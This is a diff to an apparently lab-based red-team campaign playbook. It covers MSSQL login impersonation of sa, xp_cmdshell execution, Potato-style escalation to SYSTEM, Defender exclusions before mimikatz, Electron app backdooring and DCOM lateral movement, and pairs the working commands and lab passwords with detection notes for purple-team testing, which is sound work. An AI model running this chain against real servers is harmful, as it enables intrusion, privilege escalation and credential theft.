@@ -17,46 +17,38 @@
 | ----------------------- | ------------------------------------------------------------------------------------------------------ |
 | **Target**              | mbr01 (192.168.77.22) — SQL Server + machine access                                                    |
 | **Source of this path** | SQL enumeration: svc_mssql is NOT sysadmin, but analyst_t1 has IMPERSONATE on sa                       |
-| **From**                | Kali (192.168.77.60) → mbr01:1433                                                                      |
-| **Starting cred**       | `s3rv1c3_MSSQL!` (Phase 2) + `T13r_An@lyst!` (analyst_t1 — discovered via SQL enum + Kerberoast/crack) |
+| **From**                | Kali (192.168.77.60) → mbr01:1433 **or** `ws01` (192.168.77.62) → direct WinRM                        |
+| **Starting cred**       | `analyst_t1` (`T13r_An@lyst!`) — discovered via SQL enum + Kerberoast/crack                            |
 | **What you earn**       | OS command execution on mbr01 → SeImpersonatePrivilege → SYSTEM via GodPotato                          |
-| **Auth method**         | **SQL auth** (no `-windows-auth` flag) — works from non-domain-joined Kali                             |
+| **Auth method**         | **SQL auth** (no `-windows-auth` flag) — works from non-domain-joined Kali **or** PowerShell/WinRM from `ws01` |
 
 
-**Step 1 — Enumerate with svc_mssql (discover the path):**
+**Step 1 — Enumerate with `analyst_t1` (discover the path):**
+
+> Identity note: `svc_mssql` (`s3rv1c3_MSSQL!`) was Kerberoasted in Phase 2, but SQL enumeration shows it is **not sysadmin**. `analyst_t1` is the account that has `IMPERSONATE` on `sa`. The campaign uses the right credential at each machine — not a single account everywhere.
 
 ```bash
-# SQL auth — no -windows-auth flag needed
-impacket-mssqlclient 'svc_mssql:s3rv1c3_MSSQL!@192.168.77.22'
-SELECT IS_SRVROLEMEMBER('sysadmin');                -- → 0 (NOT sysadmin)
-SELECT value_in_use FROM sys.configurations WHERE name = 'xp_cmdshell';  -- → 1 (enabled, but no EXECUTE)
-EXEC xp_cmdshell 'whoami';                          -- → ERROR: EXECUTE permission denied
+# SQL auth from Kali (or from ws01 via WinRM staging) — no -windows-auth flag needed
+impacket-mssqlclient 'analyst_t1:T13r_An@lyst!@192.168.77.22'
+SELECT IS_SRVROLEMEMBER('sysadmin');                -- → 0 (NOT sysadmin as analyst_t1)
 SELECT name FROM sys.server_principals WHERE principal_id IN
   (SELECT grantee_principal_id FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE');
   -- → analyst_t1 has IMPERSONATE on sa
 ```
 
-**Step 2 — Crack analyst_t1's password:**
-
-analyst_t1 has a Cyrillic homoglyph SPN registered (`MSSQLSvc/mbr01.child.c[а]dre.loc[а]l:1433` — WT#27 prep). Kerberoast it using the TGT from Phase 2:
-
-```bash
-export KRB5CCNAME=analyst_t2.ccache
-impacket-GetUserSPNs child.cadre.local/analyst_t2 -k -no-pass \
-  -dc-ip 192.168.77.11 -request -outputfile analyst_t1_tgs.txt
-hashcat -m 13100 analyst_t1_tgs.txt /home/vagrant/cadre_passwords.txt
-# analyst_t1 → T13r_An@lyst!
-```
+**Automation (run from local host or provisioning):** `attack-matrix/04-automation/linux/campaign-a/T043-impersonate-ws01.sh` stages the PowerShell helper and executes the SQL impersonation from `ws01` as `analyst_t1`.
 
 ### WT043 — Impersonate sa → xp_cmdshell
 
 ```bash
-# SQL auth — no -windows-auth flag needed
+# SQL auth from Kali
 impacket-mssqlclient 'analyst_t1:T13r_An@lyst!@192.168.77.22'
 EXECUTE AS LOGIN = 'sa';                            -- → Impersonation successful
 SELECT IS_SRVROLEMEMBER('sysadmin');                -- → 1 (sysadmin via sa)
 EXEC xp_cmdshell 'whoami';                          -- → nt service\mssql$sqlexpress ✅
 ```
+
+**PowerShell/WinRM automation from `ws01` as `analyst_t1`:** The helper `attack-matrix/04-automation/linux/windows/campaign-a-t043-impersonate.ps1` connects to `mbr01:1433` using `analyst_t1` SQL credentials, impersonates `sa`, and executes arbitrary commands. The Bash wrapper `T043-impersonate-ws01.sh` stages and runs it from the local host or provisioning via `ws01`.
 
 **Step 2 — Enumerate mbr01 via xp_cmdshell:**
 
@@ -155,7 +147,7 @@ EXEC xp_cmdshell 'C:\Windows\Temp\cadre-tools\JuicyPotatoNG.exe -t * -p cmd.exe 
 EXEC xp_cmdshell 'C:\Windows\Temp\cadre-tools\PrintSpoofer64.exe -i -c cmd /c whoami';
 ```
 
-**Automation:** `attack-matrix/04-automation/linux/campaign-a/T043-lpe-alternatives-ws01.sh` stages the binaries and tries each candidate via `winrs` from `ws01` to `mbr01`.
+**Automation:** `attack-matrix/04-automation/linux/campaign-a/T043-lpe-alternatives-ws01.sh` stages the binaries and tries each candidate via `winrs` from `ws01` to `mbr01`. **Verified path:** `GodPotato.exe` staged from `ws01` to `C:\Windows\Temp\cadre-tools` on `mbr01` returns `nt authority\system` when invoked through the SQL `xp_cmdshell` channel. The reusable helper `attack-matrix/04-automation/linux/windows/campaign-a-t043-system-exec.ps1` runs an arbitrary PowerShell script block as SYSTEM on `mbr01` via this verified SQL → GodPotato channel.
 
 **Result:** `nt authority\system` on mbr01. All subsequent commands execute as SYSTEM via the `xp_cmdshell` chain: `EXEC xp_cmdshell 'C:\Windows\Temp\cadre-tools\<tool>.exe -cmd "cmd /c <COMMAND>"'`.
 
@@ -166,6 +158,8 @@ EXEC xp_cmdshell 'C:\Windows\Temp\cadre-tools\PrintSpoofer64.exe -i -c cmd /c wh
 - If **all** Potato variants fail, enable missing privileges with `FullPowers` or switch to `KrbRelayUp` (Kerberos relay LPE, no SeImpersonate needed).
 
 > **🆕 Optional Precursor — Defender Exclusion via PowerShell (T1562.001):** Real-world attackers typically disable Defender for their specific payload directory **before** running mimikatz/AMSI bypass — without disabling the entire Defender service. Use `Add-MpPreference -ExclusionPath "C:\Users\analyst_cloud\AppData\Local\Temp"` to whitelist the directory, then run mimikatz from there. Cleaner than full Defender disable (no Tamper Protection override needed). Detection: WinSec 5001 + Sysmon EID 1 (`powershell.exe` + `*MpPreference*ExclusionPath*`). See Campaign_suggestions #108 + CAMPAIGNS-METADATA "Mechanics: Item #108". Not in main spine — held for Phase 3 alternative execution cycle. **NOTE:** CADRE lab currently has Defender fully disabled per `04-vulnerabilities.yml`; this precursor requires re-enabling Defender for realistic test.
+
+> **Verified helper chain:** `T043-impersonate-ws01.sh` → `campaign-a-t043-impersonate.ps1` → `campaign-a-t043-system-exec.ps1` → `nt authority\system` on `mbr01` via SQL auth as `analyst_t1`. This chain is the primary execution engine for all subsequent SYSTEM-level actions on `mbr01` in the current campaign run.
 
 ---
 
@@ -313,6 +307,23 @@ Replace `resources/app` JS code in signed Electron apps (Teams, Discord, Mailspr
 **Test:** Install Mailspring on mbr01 → backdoor with Loki C2 → verify C2 connection → verify detection.
 
 **Detection:** Sysmon EID 11 (file create in `resources\app\`), Suricata SID:1000080 (Azure Blob C2), Elastic process creation from Electron app.
+
+#### DCOMIllusionist — Fileless DCOM Lateral Movement (WT108) ⏳
+
+**Source:** Synacktiv (DCOMIllusionist). Fileless DCOM lateral movement via .NET deserialization abuse — no payload on disk. Adopted 2026-08-02 from `Campaign_suggestions.md` upgrade candidates.
+
+```bash
+# Stage a .NET deserialization gadget + DCOM activation target (mbr01 from ws01)
+# Tooling: DCOMIllusionist PoC / Synacktiv research scripts
+```
+
+**Why in campaign:** a distinct lateral vector (DCOM activation) vs the verified WinRM/SQL/coerce paths; fileless.
+
+**Test:** DCOM activation from ws01 → mbr01 as analyst_t1; verify code exec + telemetry.
+
+**Detection:** Sysmon EID 1 (dllhost.exe/scrobj.dll child), EID 10 (DCOM cross-process); Zeek DCOM/RPC.
+
+**Cross-refs:** Phase 3 Alternative Execution; `Campaign_suggestions` DCOMIllusionist.
 
 ### Phase 3 — LOLBAS Execution Techniques ⏳
 
